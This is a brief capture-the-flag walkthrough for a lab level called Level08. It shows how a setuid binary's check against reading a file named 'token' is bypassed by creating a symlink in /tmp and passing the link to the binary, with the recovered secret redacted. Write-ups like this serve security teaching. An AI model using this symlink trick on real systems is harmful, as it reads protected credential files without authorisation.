# Level08
## Step by step
- In the user `level08` home directory, there is a file
  ```bash
  > ls
  -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
  -rw-------  1 flag08  flag08    26 Mar  5  2016 token
  ```
- The binary `level08` take as argument a file not named `token` and print the content of the file in stdout.
- We want to print the content a `token` but we need to change the name file before
  ```bash
  > ln -s $PWD/token /tmp/test
  > ls
  lrwxrwxrwx 1 level08 level08 24 Jan 19 17:19 /tmp/test -> /home/user/level08/token
  > ./level08 /tmp/test
  XXX
  ```
